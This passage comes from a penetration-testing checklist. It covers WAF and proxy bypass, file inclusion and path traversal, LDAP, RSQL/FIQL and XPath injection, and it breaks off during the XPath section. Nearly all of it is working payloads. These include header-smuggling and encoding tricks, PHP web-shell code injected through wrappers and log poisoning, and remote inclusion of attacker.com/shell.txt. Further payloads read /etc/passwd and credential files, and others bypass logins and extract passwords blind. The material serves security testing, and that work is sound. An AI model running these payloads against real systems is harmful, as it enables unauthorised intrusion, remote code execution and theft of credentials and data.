+> Run these boxes when a reverse proxy (Nginx/Apache/IIS) or WAF (AWS WAF, Cloudflare, ModSecurity, Akamai…) sits in front of the app and blocks paths/payloads. Two root causes: **(1) Parser discrepancy** — the proxy/WAF and the backend disagree on what the request _means_ (path normalization, header parsing, multipart/XML grammar, character encoding), so the WAF inspects a harmless interpretation while the backend executes the real one; **(2) Inspection gaps** — the WAF simply doesn't look (request too large, wrong content-type, unkeyed location). Order: fingerprint → ACL/path-confusion → header-parsing discrepancy → size-limit bypass → content-type/multipart/XML grammar → character normalization → payload obfuscation → confirm.
+
+> This is a _bypass_ checklist — the goal is to prove the protection can be evaded so the underlying bug (SQLi/XSS/admin-path) still lands. Pair it with the relevant vuln checklist for the actual payload.
+
+***
+
+### 0. Fingerprint the Proxy / WAF
+
+* [ ] Identify the WAF: `Server` header, blocking page text, cookies (`awselb`, `__cfduid`/`cf-ray`, `barra_counter`, `BinarySec`…), unusual block codes (WebKnight `999`, 360 `493`)
+* [ ] Provoke it: send `" or 1=1 --` / `<script>alert()</script>` into params and note the block response (code, body, headers)
+* [ ] Use `wafw00f` to fingerprint
+* [ ] Identify the **backend stack** (Node/PHP/Java/.NET) — parser-discrepancy bypasses are stack-specific
+* [ ] Note whether the WAF is inline (CDN) or a module (ModSecurity) — affects which tricks apply
+
+***
+
+### 1. Nginx / Proxy ACL Path-Confusion
+
+> Proxy blocks a path with an exact-match location, but the backend normalizes differently.
+
+* [ ] **Nginx `location = /admin.php { deny }`** → bypass via `/admin.php/index.php` (or `/admin.php/`)
+  * root cause: `=` exact match; backend (PHP-FPM) still routes `/admin.php/x` to `admin.php`
+  * fix devs miss: should use `~ \.php$` regex
+* [ ] **ModSecurity `REQUEST_FILENAME` path-confusion (v3 ≤3.0.12)** — append `;`/path segments so MODSEC sees a different filename than the backend (sicuranext research)
+* [ ] **Trailing-char normalization mismatch** — add chars Nginx keeps but the backend strips: `/admin%00`, `/admin%09`, `/admin/.`, `/admin%2e`
+* [ ] **Tomcat path-param blacklist bypass:** `/path1/path2/` ≡ `;/path1;foo/path2;bar/;`
+* [ ] **IIS/ASP Classic** case/encoding: `<%s%cr%u0131pt>` ≡ `<script>` (dotless-ı normalization)
+* [ ] Try `//`, `/./`, `/../`, `;`, `%2f`, `%2e`, backslash `\` to reach a blocked path
+* [ ] Case variation on case-insensitive backends: `/Admin`, `/ADMIN.php`
+
+***
+
+### 2. Header-Parsing Discrepancy (WAF vs backend)
+
+> WAF parses a header one way, backend another → smuggle the payload in the part the WAF ignores.
+
+*   [ ] **AWS WAF malformed-header LF trick** — payload on a continuation line the WAF doesn't attribute to the header value but the backend (Node) does:
+
+    ```
+    GET / HTTP/1.1
+    Host: target.com
+    X-Query: Value
+    \t' or '1'='1' -- 
+    Connection: close
+    ```
+* [ ] Duplicate headers (WAF reads first, backend reads last — or vice-versa)
+* [ ] Header-name casing / whitespace-before-colon / tab folding
+* [ ] Put the payload in a header the WAF doesn't inspect (custom `X-*`, `Referer`, `User-Agent`) if the backend uses it in a sink
+* [ ] Obscure but parsed: `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL` to reach blocked paths
+
+***
+
+### 3. Request-Size Inspection Bypass
+
+> WAFs only inspect up to a byte limit; exceed it and the payload passes uninspected.
+
+* [ ] Identify the limit (AWS WAF defaults: \~8KB for CloudFront, larger for ALB/AppSync)
+* [ ] On a POST/PUT/PATCH, **pad the body before the payload** to push the malicious part past the inspection window:
+  * junk param/comment then the real injection
+* [ ] **`nowafpls`** (Burp ext) — auto-inserts padding to cross the limit
+* [ ] Also enables the **WAF-cookie DoS** (see DoS checklist) and oversized-header CPDoS
+* [ ] Test JSON/form/multipart bodies — limits differ per content-type
+
+***
+
+### 4. Content-Type / Multipart / XML Grammar Discrepancy (WAFFLED-style)
+
+> Emergency rules that re-parse multipart/XML are fragile — if WAF and backend implement different grammar, the WAF scans a harmless reconstruction while the backend rebuilds the real payload.
+
+**Multipart/form-data:**
+
+* [ ] **Boundary-delimiter manipulation** — remove the `\r\n` before the boundary
+* [ ] **Content-Type parameter tweak** — alter/remove the global `Content-Type` name or `boundary=` casing
+* [ ] **Content-Disposition disruption** — malform the `Content-Disposition` structure
+* [ ] **Disrupted header injection into body** — add redundant headers with broken names in the part
+* [ ] **Content-Type tweak in body** — insert chars into the per-part `Content-Type`
+* [ ] Mismatched/duplicate `name=` fields (busboy-style reconstruction differences)
+
+**XML:**
+
+* [ ] **DOCTYPE closure confusion** — extra char at the end of the XML body confuses DOCTYPE parsing
+* [ ] **Schema closure manipulation** — insert chars/elements/duplicate fields in the schema
+* [ ] **Newline abuse** — extra newline before the `Content-Type` header
+* [ ] **Content-Type header parameter removal/replacement** — drop or swap the param name
+* [ ] (XXE-that-bypasses-WAF — combine with XXE checklist)
+
+**Content-type swap:**
+
+* [ ] Send JSON as `text/plain` / form, or swap to a type the WAF doesn't parse but the backend does
+
+***
+
+### 5. Character Normalization / Encoding
+
+> WAF sees one character set, the backend normalizes to another (the malicious one).
+
+* [ ] **Unicode normalization** — chars that NFKC-fold to `<`, `'`, `/`, keywords after the WAF check (fullwidth `＜script＞`, dotless-ı, ligatures) — see IDN/Unicode-normalization checklist
+* [ ] **Overlong / double URL-encoding** — `%252e`, `%c0%ae`, `%u002e` decoded by backend but not WAF
+* [ ] **Mixed encoding** in one payload
+* [ ] **`<%s%cr%u0131pt>`** → `<script>` (IIS)
+* [ ] **Best-fit mapping** — chars the backend maps to ASCII (e.g. `ＳＥＬＥＣＴ`)
+* [ ] **Inline-handler first-statement parsing bypass** — WAF parses only the first JS statement in an event handler; prefix a harmless one: `onfocus="(history.length);PAYLOAD"` + `#elementId` fragment for click-less focus → XSS executes, WAF misses it
+
+***
+
+### 6. Payload Obfuscation (regex-filter evasion)
+
+* [ ] **Comment/junk insertion** — `<script>+-+-1-+-+confirm()</script>`, SQL inline comments `/**/`, `/*!50000*/`
+* [ ] **Whitespace/linebreak (CR/LF)** inside the payload to break regex: `<iframe src=" j a v a s c r i p t :confirm()">`
+* [ ] **HTML-entity / numeric encoding** in attributes: `href=j&#97v&#97script&#x3A;&#97lert(1)`
+* [ ] **Padding attributes** to push past regex windows: `<a aaaa aaaaa ... href=...>`
+* [ ] **Uninitialized bash vars** for command injection: `$aaaa/bin$bbbb/cat $cccc/etc$dddd/passwd` (null/empty expansion)
+* [ ] **`$IFS`** for spaces (bare `$IFS` often passes where `${IFS}` is blocked)
+* [ ] **SSL/TLS-cipher abuse** — some WAFs fail to inspect certain TLS configs (0x09AL)
+* [ ] **SNI-based backend reach** — if proxy uses SNI as backend address → SSRF (see SSRF checklist)
+* [ ] Tooling: SQLMap `--tamper=`, Awesome-WAF / Bo0oM / kh4sh3i cheat-sheets, AutoSpear, nuclei WAF-bypass templates
+
+***
+
+### 7. Confirm the Bypass
+
+* [ ] Same payload: blocked without the trick, **passes** with it (show both requests)
+* [ ] The underlying vuln actually fires post-bypass (SQLi result / XSS alert / admin page reached)
+* [ ] Note the exact discrepancy: which component normalized/parsed differently
+* [ ] Note that a WAF bypass alone is usually **informative**, not a finding — chain it to a real vuln for impact
+* [ ] Document: WAF/proxy + version, backend stack, the bypass primitive (path/header/size/grammar/encoding), and the vuln it unlocked
+
+</details>
+
+<details>
+
+<summary>File Inclusion / Path Traversal (LFI / RFI)</summary>
+
+> Run these boxes against any param that names a file the server reads or includes (`?page=`, `?file=`, `?template=`…). Distinguish: **Path Traversal** = _read_ a file outside the intended dir (`file_get_contents`-style); **LFI** = the included file is _executed_ (PHP `include`/`require`); **RFI** = the included file is fetched from a _remote_ host. The prize is LFI/traversal → **RCE** via PHP wrappers, log/proc poisoning, or phar deserialization. Order: find param → confirm read → traversal-filter bypass → PHP wrappers → filter-chain LFI2RCE → log/proc poisoning → phar/temp-file → RFI → confirm.
+
+> Always URL-encode payloads. Some HTTP clients/proxies collapse `../` before it reaches the server — send raw via Burp.
+
+***
+
+### 0. Find Candidate Parameters
+
+* [ ] Top LFI params: `page`, `file`, `path`, `include`, `inc`, `dir`, `folder`, `doc`, `document`, `template`, `view`, `content`, `layout`, `mod`, `conf`, `cat`, `action`, `board`, `detail`, `download`, `prefix`, `locate`, `show`, `site`, `type`
+* [ ] Anywhere a filename/path is reflected, fetched, rendered, or downloaded
+* [ ] File-download/export/preview/PDF/template endpoints
+* [ ] Vulnerable PHP sinks: `include`, `include_once`, `require`, `require_once`, `file_get_contents`, `fopen`, `readfile`, `file`, `show_source`
+* [ ] Java: `File`/`FileInputStream`/`getResourceAsStream`; Node: `fs.readFile`/`res.sendFile`/`require`
+
+***
+
+### 1. Confirm Read (basic traversal)
+
+* [ ] Linux: `?page=../../../../../../etc/passwd`
+* [ ] Windows: `?page=..\..\..\..\windows\win.ini` , `C:\boot.ini` , `C:\Windows\System32\drivers\etc\hosts`
+* [ ] Start with a fake dir prefix: `?page=a/../../../../etc/passwd`
+* [ ] Path equivalence: `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, `/etc/passwd/` all resolve the same
+* [ ] Interpret the response: file contents = vuln; path in error = potential; different-but-no-error = possible **blind** LFI
+* [ ] Fuzz depth with a wordlist (wfuzz/LFImap): `?page=../../../../../../FUZZ`
+* [ ] High-signal targets: `/etc/passwd`, `/etc/hosts`, `/proc/self/environ`, `/proc/self/cmdline`, app config (`config.php`, `.env`, `web.xml`)
+
+***
+
+### 2. Traversal-Filter Bypass
+
+* [ ] **Non-recursive `../` strip** → `....//....//etc/passwd` , `..../\....`
+* [ ] **URL-encode**: `..%2f..%2fetc%2fpasswd`
+* [ ] **Double-encode** (app decodes twice): `..%252f..%252fetc%252fpasswd`
+* [ ] **Overlong UTF-8**: `..%c0%af..%c0%afetc/passwd` , `%c0%ae%c0%ae/`
+* [ ] **Backslash** on Windows/mixed: `..%5c..%5cwindows%5cwin.ini`
+* [ ] **Filter-keyword split** (if "etc/passwd" blocked): `eettcc/ppaasssswwdd` (after `../` strip), `e\x00tc`, PHP concat `php://filter/resource=/e'.'tc/pa'.'sswd`
+* [ ] **Case variation** (case-insensitive FS): `../../ETC/PassWD`
+* [ ] **`assert()` injection** if filter responds "Hacking attempt!": payload like `' and die(show_source('/etc/passwd')) or '`
+* [ ] **Append-extension bypass** (sink adds `.php`): see §3 wrappers / §legacy null-byte
+
+***
+
+### 3. PHP Wrappers (read source & get RCE)
+
+**Read source (base64 so PHP doesn't execute it):**
+
+* [ ] `php://filter/convert.base64-encode/resource=index.php`
+* [ ] `php://filter/read=string.rot13/resource=index.php`
+* [ ] Case-mangle to bypass filters: `pHp://FilTer/...`
+* [ ] iconv transform: `php://filter/convert.iconv.utf-8.utf-16/resource=config.php`
+
+**Direct RCE wrappers (config-dependent):**
+
+* [ ] **`php://input`** — POST body executed as PHP (needs `allow_url_include=On`): body `<?php system($_GET['c']); ?>`
+* [ ] **`data://`** — `data://text/plain;base64,PD9waHA...` or `data://text/plain,<?php system('id'); ?>` (needs `allow_url_include=On`)
+* [ ] **`expect://`** — `expect://id` (needs expect ext loaded)
+* [ ] **`zip://`** — upload a zip then `zip://uploads/x.zip#shell.php`
+* [ ] **`phar://`** — `phar://uploads/x.jpg/shell.php` (also the deserialization vector, §6)
+
+***
+
+### 4. Filter-Chain LFI2RCE (no upload, no logs — Synacktiv)
+
+> Chain `php://filter` converters to _generate_ arbitrary bytes from nothing, producing a PHP payload purely in the filter chain → RCE on any include-based LFI that supports php filters.
+
+* [ ] Generate the chain with **php\_filter\_chain\_generator** (`--chain '<?php system($_GET[0]);?>'`)
+* [ ] Feed the resulting `php://filter/.../resource=...` blob to the LFI param
+* [ ] Works even when only file _reading_ seems possible (the chain builds the code in-stream)
+* [ ] Most reliable modern LFI→RCE when uploads/logs aren't reachable
+
+***
+
+### 5. Log & /proc Poisoning → RCE
+
+> Write PHP into a server-readable file via a request, then include it.
+
+* [ ] **Access/error log:** poison via `User-Agent: <?php system($_GET['c']); ?>` then include:
+  * `/var/log/apache2/access.log`, `/var/log/apache2/error.log`, `/var/log/httpd/access_log`, `/var/log/nginx/access.log`
+  * (use single quotes in payload — double quotes get escaped in logs and break it)
+* [ ] **Auth log (SSH):** inject PHP as the SSH username → `/var/log/auth.log`
+* [ ] **Authorization header:** `Authorization: Basic <base64 of "<?php ...">` → decoded into the log
+* [ ] **Mail:** send mail to `user@localhost` with PHP body → include `/var/mail/USER` or `/var/spool/mail/USER`
+* [ ] **`/proc/self/environ`** — inject PHP via `User-Agent`/`Referer`, include `/proc/self/environ` (RCE without writing to disk; needs world-readable environ)
+* [ ] **`/proc/self/fd/N`** — when the log path is unknown but the worker holds it as an fd
+* [ ] Containerized: inspect `/proc/<pid>/cmdline` for secrets passed at exec time
+
+***
+
+### 6. phar:// Deserialization & Temp-File RCE
+
+* [ ] **phar:// deserialization** — when the LFI only _reads_ (`file_get_contents`/`file_exists`/`md5_file`/`filesize`/`fopen`), point a `phar://` at a crafted `.phar` (disguised as jpg) → unserialize of its metadata triggers a POP chain (see deserialization checklist)
+* [ ] **phpinfo() temp-file race** — if a phpinfo page exists: upload a multipart file (creates a temp file), use big headers to stall PHP, read the temp filename from the phpinfo output, then LFI the temp path before deletion (fimap automates this)
+* [ ] **Generic upload→include** — any uploaded file with a known path: include it for RCE (image with embedded `<?php`)
+* [ ] **PHP\_SESSION\_UPLOAD\_PROGRESS** — force a session file to be written with attacker content, then include `/var/lib/php/sessions/sess_<id>`
+
+***
+
+### 7. Remote File Inclusion (RFI)
+
+> Needs `allow_url_include=On` (off by default since PHP 5). Best case: include attacker-hosted code → instant RCE.
+
+* [ ] `?page=http://attacker.com/shell.txt` (`<?php system($_GET['c']); ?>`)
+* [ ] Bypass scheme filters: `https://`, `ftp://`, `//attacker.com/shell.txt`, URL-encoded `http:%2f%2f...`
+* [ ] **Scheme-relative when app prepends `https:`** → `//attacker.com/shell`
+* [ ] **Windows UNC / SMB** (works even with `allow_url_include=Off`): `\\attacker.com\share\shell.php` — path looks "local" to the runtime
+* [ ] Reuse LFI filter bypasses for the RFI param
+* [ ] Null-byte/`?`/`#` to truncate an appended extension on legacy PHP
+
+***
+
+### 8. Legacy Tricks (old PHP, still seen)
+
+* [ ] **Null byte** (PHP <5.3.4): `?page=../../../etc/passwd%00` (truncates appended `.php`)
+* [ ] **Path truncation** (PHP <5.3): pad with `/././././…` or `.\.\.` past the length limit so the appended extension is dropped
+* [ ] **Dot/slash padding**: `/etc/passwd................`
+* [ ] Wrap with a fake extension when whitelist checks suffix: `../../etc/passwd.jpg` (+ null byte / truncation)
+
+***
+
+### 9. Confirm Impact
+
+* [ ] Arbitrary file read (`/etc/passwd`, app source via base64 filter, secrets/config, SSH keys)
+* [ ] Source disclosure → find more bugs / hardcoded creds
+* [ ] **RCE** via filter chain / log-proc poisoning / phar / RFI / temp-file race
+* [ ] SSRF/internal access via `http://` RFI or wrappers
+* [ ] phar:// → deserialization chain
+* [ ] Blind LFI confirmed (timing/error) even without output
+* [ ] Tooling: **LFImap**, **fimap**, **LFISuite**, **Panoptic**, php\_filter\_chain\_generator, wfuzz + LFI wordlists (carlospolop Auto\_Wordlists, soffensive windows-files)
+* [ ] Re-verify on a clean request; document the param, the read-vs-execute behavior, the bypass used, and the file/RCE achieved
+
+</details>
+
+<details>
+
+<summary>LDAP Injection</summary>
+
+> Run these boxes against any input that flows into an LDAP search filter (login forms, user/group search, address books, "lookup by attribute"). LDAP filters use prefix notation — `(&(a=1)(b=2))` = AND, `(|...)` = OR, `(!...)` = NOT, `*` = wildcard. The bug is the same shape as SQLi/NoSQLi: unsanitized input lets you inject filter metacharacters `* ( ) & | ! =` to flip query logic → auth bypass or blind data extraction. Order: find the sink → confirm injection → auth bypass → blind boolean confirmation → char-by-char attribute extraction → attribute/objectClass enumeration → tooling → impact.
+
+> Syntax matters: a malformed filter throws an error. Keep it to **one** filter, start with `&` or `|`, and balance the parentheses the app appends. `(&)` = absolute TRUE, `(|)` = absolute FALSE.
+
+***
+
+### 0. Find Candidate Sinks
+
+* [ ] LDAP-backed login forms (`(&(uid=USER)(userPassword=PASS))`)
+* [ ] User/group/people search, directory lookup, address book
+* [ ] "Find by email/cn/department" features, org-chart browsers
+* [ ] Anywhere a value lands inside `(attr=VALUE)`
+* [ ] Tells: AD/LDAP error strings, results that look like directory objects, `objectClass`/`cn`/`dn` in responses
+
+***
+
+### 1. Confirm Injection (break the filter)
+
+* [ ] Inject a single `*` → does it act as a wildcard (more results)?
+* [ ] Inject `(` or `)` alone → error/different behavior = metacharacters reach the filter
+* [ ] Inject `*)(uid=*))(|(uid=*` style and watch for syntax error vs broadened result
+* [ ] Inject `)(objectClass=*` and observe
+* [ ] Test the meta set individually: `*`, `(`, `)`, `&`, `|`, `!`, `=`, `\`
+
+***
+
+### 2. Authentication Bypass
+
+> Goal: make the filter always-true or neutralize the password clause.
+
+* [ ] **Wildcard user+pass:** `user=*` `pass=*` → `(&(user=*)(password=*))` (matches everything)
+* [ ] **Wildcard username only:** `user=*)(uid=*))(|(uid=*` → broadens to all users
+* [ ] **Inject always-true AND:** `user=admin)(&(|` `pass=any` → `(&(uid=admin)(&(|)(password=any))`
+* [ ] **NOT-trick** (PaTT): `user=admin)(!(&(1=0` `pass=q)` → `(&(uid=admin)(!(&(1=0)(userPassword=q))))`
+* [ ] **Comment-out the rest:** `user=admin))%00` or `user=admin)(cn=*))` `pass=any` → trailing clause ignored
+* [ ] **Truncate so nothing else runs:** `user=*))` → `(&(user=*))` (password clause dropped)
+* [ ] **OR-inject a known hash:** `user=*)(uid=*))(|(uid=*` `pass=...` → `(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))`
+* [ ] Note: password may be stored hashed (clear/md5/smd5/sha/sha1/crypt) — wildcards on `userPassword` still help
+
+***
+
+### 3. Blind LDAP Injection — Confirm the Oracle
+
+> When no data/errors are returned, force a TRUE vs FALSE and watch for any UI difference (an icon, a result, a redirect).
+
+* [ ] **Force TRUE** (something shows): `*)(objectClass=*))(&(objectClass=void` → `(&(objectClass=*)(objectClass=*))(&(objectClass=void)(type=X*))`
+* [ ] **Force FALSE** (nothing shows): `void)(objectClass=void))(&(objectClass=void` → all-false
+* [ ] **OR-blind variant:** `(|(objectClass=void)(objectClass=users))(&(objectClass=void)(type=X*))`
+* [ ] Confirm the two payloads produce reliably different responses = exploitable blind oracle
+
+***
+
+### 4. Blind Extraction — Char-by-Char (wildcard walk)
+
+> Use `attr=prefix*` and the TRUE/FALSE oracle to recover values one char at a time.
+
+* [ ] Confirm the attribute exists: `(&(sn=administrator)(password=*))` → OK
+* [ ] Walk the first char: `(&(sn=administrator)(password=A*))` … `(password=M*))` → OK
+* [ ] Extend the prefix: `(password=MA*))` → KO, `(password=MY*))` → OK …
+* [ ] Iterate ASCII letters, digits, symbols per position until full value recovered
+* [ ] Script the loop against the oracle (binary-search-style)
+* [ ] **`userPassword` is an OCTET STRING, not text** — use `octetStringOrderingMatch` (OID 2.5.13.18) `>=`/`<=` comparisons for a true binary search (bit-by-bit big-endian) instead of pure prefix matching
+* [ ] Extract any sensitive attribute the same way (tokens, IDs, internal fields)
+
+***
+
+### 5. Attribute & objectClass Enumeration
+
+* [ ] **Wildcard to dump all entries:** inject `*` into the search → `(uid=*)` returns every user
+* [ ] **Reveal hidden attributes:** inject `*)(ATTRIBUTE=*` to pull attrs not normally shown (email, guid, description, memberOf)
+* [ ] Default attributes to probe: `userPassword`, `cn`, `sn`, `givenName`, `commonName`, `mail`, `objectClass`, `name`, `uid`, `memberOf`, `description`
+* [ ] **Enumerate objectClass values** via blind: `(&(objectClass=*)(objectClass=users))...`, `...(objectClass=Resources)...` — if TRUE, that class exists
+* [ ] Map the directory structure / privileged groups for escalation
+
+***
+
+### 6. Tooling
+
+* [ ] Burp Intruder / custom script for the char-by-char oracle walk
+* [ ] **ldapsearch** to validate recovered filters/DNs out-of-band (if you have access)
+* [ ] PayloadsAllTheThings LDAP Injection list; Blackhat-EU-2008 Blind-LDAP-Injection paper for theory
+* [ ] (Adjacent, not injection: `hydra ldap`, nmap `ldap-brute`, Metasploit `ldap_login`, LDAP pass-back for credential capture)
+
+***
+
+### 7. Confirm Impact
+
+* [ ] Authentication bypass (login as user/admin)
+* [ ] Blind exfiltration of passwords/hashes/sensitive attributes (char-by-char)
+* [ ] Unauthorized directory enumeration (all users, hidden attributes, groups)
+* [ ] Privilege escalation via discovered group membership / objectClass
+* [ ] Re-verify with a clean request; document the param, the filter context (`&`/`|`, what's appended), the bypass/extraction payload, and the data recovered
+
+</details>
+
+<details>
+
+<summary>RSQL / FIQL Injection</summary>
+
+> Run these boxes against REST APIs that use **RSQL/FIQL** as a filter language (MOLGENIS, Spring + rsql-parser, many JSON:API backends). RSQL expresses query filters in URI-friendly syntax: `;`/`and`, `,`/`or`, `==`, `!=`, `=in=`, `=out=`, `=like=`, `=gt=`/`>`, `=lt=`/`<`, `=rng=`, with `*` as a wildcard. Like SQLi/LDAPi, the bug is unsanitized user input concatenated into the filter → **query-logic manipulation, authorization bypass, data exfiltration, IDOR** (rarely RCE). Because RSQL filters often map directly onto DB columns/relations, you can reach fields and rows the endpoint never meant to expose. Order: find the entry point → confirm injection → auth bypass → user enumeration/leak → authorization evasion → privilege escalation / IDOR → operator-filter bypass → impact.
+
+> FIQL uses only URI-safe chars (no encoding needed), which is exactly why it's easy to inject. Send the raw operators.
+
+***
+
+### 0. Find the Entry Point
+
+* [ ] Filter params: `q=`, `query=`, `filter=`, `filter[field]=`, `search=`
+* [ ] Response/JSON:API params that map to RSQL: `include=`, `sort=`, `fields[resource]=`, `page[size]`, `page[number]`
+* [ ] POST/PUT/TRACE JSON body: `{"query":"..."}`
+* [ ] HTTP headers (some APIs accept the query in a header)
+* [ ] Tells: `=in=`/`=gt=` style operators in the app's own requests, MOLGENIS, Spring stack, JSON:API response shape, `?q=field==value` patterns
+
+***
+
+### 1. Confirm Injection
+
+* [ ] Baseline: `?q=username==admin` (legit filter) → note normal response
+* [ ] Add a second clause with `;` (AND) / `,` (OR): `?q=username==admin,username==guest` → more results = operators honored
+* [ ] Wildcard: `?q=username==*` → returns everything = injectable wildcard
+* [ ] Negation / range to probe behavior: `?q=id=gt=0`, `?q=username!=zzz`
+* [ ] Malformed operator → error reveals RSQL/FIQL parser (rsql-parser stack trace)
+
+***
+
+### 2. Authentication Bypass
+
+> Inject a wildcard or extra clause so a credential check passes.
+
+* [ ] GET: `?q=username==admin;password==*` (password wildcard)
+* [ ] `filter[username]==admin;password==*`
+* [ ] POST/PUT/TRACE body: `{"query":"username==admin;password==*"}`
+* [ ] Header form: `<Header>: username==admin;password==*`
+* [ ] Guess password char-by-char with sequential + `*`: `password==a*`, `password==b*` … (blind oracle on response difference)
+* [ ] OR-inject an always-true clause: `?q=username==admin,1==1`
+
+***
+
+### 3. User Enumeration & Information Leakage
+
+* [ ] Registration/"email exists" endpoint expecting `?email=x` → inject RSQL: `?q=email==x*` or `email=like=x` → if it returns the **user object** instead of true/false, you've leaked data
+* [ ] Enumerate by partial match: `?q=username=like=adm`, `?q=email==*@company.com`
+* [ ] Pull related data via `include`: `?include=roles,permissions`
+* [ ] Use `=in=`/`=out=` to bucket users: `?q=role=in=(admin,superuser)`
+* [ ] Recover hidden fields with `fields[users]=id,name,email,password`
+
+***
+
+### 4. Authorization Evasion (read data you shouldn't)
+
+> As a low-priv user, use filters to reach the full dataset the endpoint gates.
+
+* [ ] Filter the protected collection directly: `?q=id=gt=0` (all rows)
+* [ ] Broad wildcard match: `?q=username==*` on a list endpoint that should be scoped to you
+* [ ] Letter-bucket extraction: `?q=userId=like=a` → repeat across chars to enumerate everyone
+* [ ] Confirm you're seeing other tenants'/users' records
+
+***
+
+### 5. Privilege Escalation
+
+* [ ] Enumerate admins: `?q=role==admin`, `?q=permissions=in=(ADMIN,SUPERUSER)`
+* [ ] Once an admin identifier is known, inject/replace the filter with their ID to inherit their view/role: `?q=id==<adminId>` or `;userId==<adminId>`
+* [ ] Test role-gated endpoints with an appended role filter to see if access control is filter-driven (and thus bypassable)
+
+***
+
+### 6. Impersonation / IDOR via `include` & filters
+
+* [ ] Profile endpoint shows _your_ data → append a filter to reach another user: `?q=id==<victimId>` / `filter[id]=<victimId>`
+* [ ] Abuse `include` to pull sensitive related fields (language, country, **password**, tokens): `?include=password,country`
+* [ ] Combine filter + include to read another user's full profile
+* [ ] Modify identifiers between users through filters → unauthorized resource access
+
+***
+
+### 7. Operator / Filter-Bypass Notes
+
+* [ ] If `*` is blocked, try `=like=`/`=q=` (contains) for the same wildcard effect
+* [ ] If `==` blocked, try `=eq=` / `!=` negation logic
+* [ ] Switch FIQL ↔ alt notation (`=gt=` vs `>`, `;` vs `and`) to dodge naive denylists
+* [ ] Parenthesized sub-queries for complex logic: `?q=(role==admin,role==mod);active==true`
+* [ ] Custom operators may exist (`=all=`, `=rng=`) — test them
+* [ ] No URL-encoding needed (FIQL is URI-safe) — but try encoding `;`→`%3B`, `,`→`%2C` if a proxy/WAF mangles them
+* [ ] Watch for SQL/JPA leakage — some backends pass RSQL → SQL/JPQL; test if a value reaches SQL (then pivot to SQLi checklist)
+
+***
+
+### 8. Confirm Impact
+
+* [ ] Authentication bypass (wildcard/clause injection)
+* [ ] Unauthorized data read (authorization evasion / full-collection filter)
+* [ ] User enumeration & sensitive-field leakage (via `include`/`fields`)
+* [ ] Privilege escalation (admin-ID filter)
+* [ ] IDOR / impersonation (cross-user filter + include)
+* [ ] Data modification/deletion if filters reach write/sort operations (e.g. `sort=`/`delete` concatenation)
+* [ ] Re-verify on a clean session; document the param, the operators used, and the records/fields reached
+
+</details>
+
+<details>
+
+<summary>XPath Injection</summary>
+
+> Run these boxes against any input that flows into an **XPath/XQuery** query over an XML document (login against an XML user store, XML-backed search/lookup, config/feed queries). Same shape as SQLi/LDAPi: unsanitized input lets you inject XPath metacharacters (`'`, `(`, `)`, `/`, `*`, `[`, `]`, `=`) to flip query logic → auth bypass or blind data extraction. **Key difference from SQL: XPath has no comment syntax** — you can't `--` away the rest, so you neutralize trailing clauses with `or`/`and` expressions instead. XPath also has _no access control_ — once you can query, you can read **any** node in the document. Order: find the sink → confirm → auth bypass → blind boolean extraction → schema discovery → OOB/error-based → file read → tooling → impact.
+
+***
+
+### 0. Find Candidate Sinks
+
+* [ ] XML-backed login (`//users/user[username='U' and password='P']`)
+* [ ] XML search / lookup / filter features, product catalogs, address books backed by XML
+* [ ] Anywhere user input lands inside an XPath/XQuery predicate `[ ... ]`
+* [ ] Config/feed/SOAP/SAML processors that query XML by user value
+*   [ ] Canonical vulnerable pattern (PHP):
+
+    ```php
+    $q = "//users/user[username='".$_POST['user']."' and password='".$_POST['pass']."']";
+    ```
+
+***
+
+### 1. XPath Syntax Primer (selection you'll use)
+
+* [ ] `nodename` selects nodes by name; `/` absolute path; `//` anywhere in doc
+* [ ] `/bookstore`, `bookstore/book`, `//book` (descendant), `//user/node()` / `child::node()` (all values)
+* [ ] Positions: `//user[position()=1]/name`, `//user[last()-1]/name`, `[position()=2]`
+* [ ] Attributes: `@*`, `//user/@id`
+* [ ] Key functions: `count()`, `string-length()`, `substring(S,N,1)`, `name()`, `string-to-codepoints()`, `concat()`, `text()`
+* [ ] IE quirk: first node is `[0]` (W3C says `[1]`)
+
+***
+
+### 2. Confirm Injection
+
+* [ ] Inject a single `'` → error/different behavior = metachars reach the query
+* [ ] Boolean differential: `'` + `or '1'='1` vs `or '1'='2` → different results = injectable
+* [ ] Probe structure: `x' or name()='username' or 'x'='y`
+* [ ] `'` + `and count(/*)=1 and '1'='1` (root-count true/false)
+
+***
+
+### 3. Authentication Bypass
+
+> No comments in XPath — use `or` to void the rest of the predicate.
+
+* [ ] `' or '1'='1`
+* [ ] `' or ''='`
+* [ ] `x' or 1=1 or 'x'='y`
+* [ ] `' or 1] %00` (truncate-ish) / `') or ('1'='1`
+* [ ] Resulting query: `//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text()`
+* [ ] **Select a specific account:** put a real username in the user field and `' or '1'='1` in password to log in as that user
+* [ ] Try both string-quote contexts: `'` and `"`
+
+***
+
+### 4. Blind Boolean Extraction (Boolenization)
+
+> Force True/False and watch the response (login ok/fail, "product available", status 200 vs 401). Always scripted — a small doc still needs thousands of queries.
+
+* [ ] **Find string length:** `' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''='`
+* [ ] **Extract char-by-char:** `' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''='`
+* [ ] Codepoint variant (avoids quoting issues): `substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_HERE)`
+* [ ] Range/binary-search to speed up: `... and substring(...,1,1) < codepoints-to-string(110)`
+* [ ] Iterate alphabet `a-zA-Z0-9` + symbols `{}_()` per position
+* [ ] Target nodes: password, token, any sibling node — `child::node()[position()=2]` is often the password
+*   [ ] Script it (HackTricks/OWASP Python pattern):
+
+    ```python
+    # 1) find length: ...&userid=2 and string-length(password)=<i>  → look for TRUE_COND
+    # 2) per pos: ...&userid=2 and substring(password,<i>,1)=<char> → look for TRUE_COND
+    ```
+
+***
+
+### 5. Schema / Structure Discovery (no prior knowledge of tags)
+
+> Walk the tree with `count()`, then recover tag names with `name()` + `substring` + `string-to-codepoints`.
+
+* [ ] **Count the tree depth/breadth:**
+  * `and count(/*)=1` (one root)
+  * `and count(/*[1]/*)=2` (root has 2 children)
+  * `and count(/*[1]/*[1]/*)=1` … keep descending to map the whole schema
+* [ ] **Confirm a tag name:** `and name(/*[1])="root"`
+* [ ] **Recover name chars:** `and substring(name(/*[1]/*[1]),1,1)="a"`
